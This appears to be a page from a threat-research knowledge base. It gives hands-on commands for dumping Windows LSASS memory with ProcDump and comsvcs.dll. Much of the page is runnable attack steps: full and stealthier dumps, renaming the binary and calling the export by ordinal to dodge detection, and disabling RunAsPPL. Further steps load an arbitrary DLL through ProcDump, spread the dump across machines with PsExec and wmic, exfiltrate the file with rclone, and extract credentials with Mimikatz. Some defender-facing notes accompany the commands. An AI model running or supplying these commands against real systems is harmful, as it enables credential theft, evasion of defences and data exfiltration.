# ProcDump / comsvcs.dll MiniDump — Hands-On Use Cases

## Contents
- [Baseline Full-Memory LSASS Dump (ProcDump)](#baseline-full-memory-lsass-dump-procdump)
- [MiniPlus Dump for a Smaller, Still-Usable Capture](#miniplus-dump-for-a-smaller-still-usable-capture)
- [Triage Dump for a Minimal Footprint](#triage-dump-for-a-minimal-footprint)
- [Clone-Based Capture to Reduce Target Outage](#clone-based-capture-to-reduce-target-outage)
- [Queuing the Dump Through Windows Error Reporting](#queuing-the-dump-through-windows-error-reporting)
- [Renaming the ProcDump Binary to Defeat Filename Matching](#renaming-the-procdump-binary-to-defeat-filename-matching)
- [Fully Unattended, Scripted ProcDump Invocation](#fully-unattended-scripted-procdump-invocation)
- [ProcDump's Callback-DLL Mechanism for Unsigned-DLL Execution](#procdumps-callback-dll-mechanism-for-unsigned-dll-execution)
- [Baseline comsvcs.dll MiniDump via rundll32](#baseline-comsvcsdll-minidump-via-rundll32)
- [comsvcs.dll MiniDump Invoked by Ordinal Instead of Name](#comsvcsdll-minidump-invoked-by-ordinal-instead-of-name)
- [Checking and Disabling RunAsPPL Before a Dump Attempt](#checking-and-disabling-runasppl-before-a-dump-attempt)
- [Fleet-Wide Deployment and Triggering via an Existing Remote-Execution Tool](#fleet-wide-deployment-and-triggering-via-an-existing-remote-execution-tool)
- [Exfiltrating the Dump File](#exfiltrating-the-dump-file)
- [Offline Parsing of the Resulting Dump](#offline-parsing-of-the-resulting-dump)

---

## Baseline Full-Memory LSASS Dump (ProcDump)

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)

The canonical procedure example cited across nearly every real-world APT41/HAFNIUM/Indrik Spider-style write-up:

```cmd
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

Or targeting an explicit PID (avoids the "only one match can exist" name-resolution requirement, and is the pattern most real intrusions actually use):

```cmd
tasklist /svc | findstr lsass
procdump64.exe -accepteula -ma 672 C:\Windows\Temp\lsass.dmp
```

`-ma` is what makes the dump usable — a default `-mm` Mini dump omits the memory regions an offline parser needs. Operator must be a local administrator on the target with `SeDebugPrivilege` available (default for local Administrators group).

## MiniPlus Dump for a Smaller, Still-Usable Capture

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
procdump64.exe -accepteula -mp lsass.exe lsass_mp.dmp
```

10–75% the size of a `-ma` Full dump (per Microsoft's own sizing guidance) while retaining nearly all the same content — a real operator tradeoff when the exfil channel is bandwidth-constrained or the target has EDR alerting on unusually large file writes to non-standard paths.

## Triage Dump for a Minimal Footprint

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
procdump64.exe -accepteula -mt lsass.exe lsass_triage.dmp
```

Smallest of the three dump types relevant here. Microsoft's own documentation notes sensitive-data removal is "attempted but not guaranteed" — an operator choosing this type is optimizing for size/stealth over completeness, and a defender recovering a Triage-type dump should not assume it's a benign diagnostic artifact just because it's smaller than a Full dump.

## Clone-Based Capture to Reduce Target Outage

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
procdump64.exe -accepteula -r 1 -ma lsass.exe lsass.dmp
```

Dumps from a clone of the process (Page-file-backed Snapshot on Windows 8.1+) rather than suspending the live `lsass.exe` directly — reduces the visible outage/hang window on the target, which matters because an unusually long `lsass.exe` freeze is itself a coarse behavioral tell some monitoring picks up on. `-r` does not change which API gets called or which access rights get requested — it changes how the target process is briefly paused, not whether PPL blocks the attempt.

## Queuing the Dump Through Windows Error Reporting

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
procdump64.exe -accepteula -ma -wer lsass.exe
```

Routes the dump through the Windows Error Reporting queue rather than (or alongside) a direct file write to an operator-chosen path — an alternate delivery mechanic worth an analyst knowing exists so a WER-queued crash dump isn't dismissed as routine without checking what process it names.

## Renaming the ProcDump Binary to Defeat Filename Matching

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/), [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities)

```cmd
copy procdump64.exe svchelper.exe
svchelper.exe -accepteula -ma lsass.exe C:\Windows\Temp\update.dmp
```

The literal filename and even the `.dmp` output extension are trivially operator-controlled. The compiled-in PE `OriginalFileName`/`InternalName` VERSIONINFO fields survive this rename untouched — see `05`'s Hunting Priority table for why this is the same PE-metadata pattern already established for `../PsExec/`, `../Rclone/`, and `../Advanced IP Scanner-SoftPerfect NetScan/SoftPerfect NetScan/`.

## Fully Unattended, Scripted ProcDump Invocation

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

The same `-accepteula` flag from the baseline case above — called out separately because omitting it against a target with no prior ProcDump run blocks on an interactive EULA dialog, which fails silently (or hangs visibly) in any non-interactive remote-execution context (`PsExec -d`, a C2 beacon's command execution, a scheduled task). Any automated/at-scale use of ProcDump in this module's other use cases below assumes `-accepteula` is present.

## ProcDump's Callback-DLL Mechanism for Unsigned-DLL Execution

**MITRE ATT&CK:** [T1202](https://attack.mitre.org/techniques/T1202/) (Indirect Command Execution)

A distinct capability from everything else on this page — **not LSASS-related** — but the technique LOLBAS's own `Procdump` catalog entry actually documents (see `01`'s finding):

```cmd
procdump64.exe -accepteula -md C:\Users\Public\payload.dll explorer.exe
```

`-md` tells ProcDump to delegate memory-dump-content selection to a `MiniDumpCallbackRoutine` function inside the specified DLL — which means ProcDump loads and executes that DLL's code as a side effect of "taking a dump" of an arbitrary target process (`explorer.exe` here, but any running process works). This is a code-execution primitive riding on a signed Microsoft diagnostic tool, useful for a blue teamer to recognize as categorically different from every other use case on this page even though it's the same binary.

## Baseline comsvcs.dll MiniDump via rundll32

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```cmd
tasklist /svc | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full
```

No delivery step at all — `comsvcs.dll` is already present. Verified live against the LOLBAS Project's own `Comsvcs` entry as the documented syntax. The `full` argument at the end is required for a dump equivalent in purpose to ProcDump's `-ma`.

## comsvcs.dll MiniDump Invoked by Ordinal Instead of Name

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/), [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information)

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 672 C:\Windows\Temp\lsass.dmp full
```

Calls the same exported function by its ordinal number rather than the literal string `MiniDump` — defeats any hunt matching on the word "MiniDump" appearing in a command line. **Caveat carried over from `01`:** this specific ordinal is commonly cited across third-party write-ups, not independently confirmed here against a primary Microsoft source — the underlying `rundll32.exe target.dll,#N` calling convention itself is a documented, generic `rundll32` feature, so the technique class is solid even if the exact ordinal number should be treated as reported-not-verified.

## Checking and Disabling RunAsPPL Before a Dump Attempt

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools)

```powershell
# Check current state
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue

# If present and enabled, both techniques above fail with Access Denied until
# an administrator disables it — a real, auditable, reboot-gated action per
# Microsoft's own documented procedure, not a silent bypass:
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -Value 0
Restart-Computer
```

This isn't a stealth move — it requires a reboot and produces a `WinInit` Event 12 state change an analyst can catch on the next boot (see `05`). Included here because it's a real, documented prerequisite step an operator with sufficient privilege actually has to take against a hardened target before either technique above will succeed at all.

## Fleet-Wide Deployment and Triggering via an Existing Remote-Execution Tool

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/), [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares)

Neither ProcDump nor `comsvcs.dll` has its own network client — chaining onto an already-built remote-execution tool is the realistic way either gets used against more than one host. Via Sysinternals PsExec (`../PsExec/`):

```cmd
psexec.exe \\target -c procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

Or, since `comsvcs.dll` needs nothing delivered, a bare WMI/`wmiexec.py`-style remote command is sufficient (`../Impacket/wmiexec/`, `../LOLBins/wmic/`):

```cmd
wmic /node:target process call create "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full"
```

The `comsvcs.dll` path is the more "native-looking" of the two at scale precisely because it requires no file drop for the remote-execution tool to stage — only the command itself has to cross the wire.

## Exfiltrating the Dump File

**MITRE ATT&CK:** [T1560](https://attack.mitre.org/techniques/T1560/) (Archive Collected Data), [T1567](https://attack.mitre.org/techniques/T1567/) (Exfiltration Over Web Service)

```cmd
rclone copy C:\Windows\Temp\lsass.dmp remote:staging --config C:\Windows\Temp\rc.conf
```

The `.dmp` file itself is the deliverable — it has to leave the target host (or at minimum leave for an operator-controlled staging location) before offline parsing can happen. See `../Rclone/` for the full exfil-tool treatment; that page's `--obscure` finding (fixed-key, reversible "encryption") applies to any credentials used to authenticate the exfil leg here too.

## Offline Parsing of the Resulting Dump

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

The `.dmp` file produced by either technique on this page is parsed identically once off the target — Mimikatz's `sekurlsa::minidump` command loads a dump file in place of a live handle and runs the same credential-extraction logic `sekurlsa::logonpasswords` uses against a live process. Full command reference and credential-structure detail: `../Mimikatz/sekurlsa (Credential Dumping)/02 - Hands-On Use Cases.md` — not re-derived here.
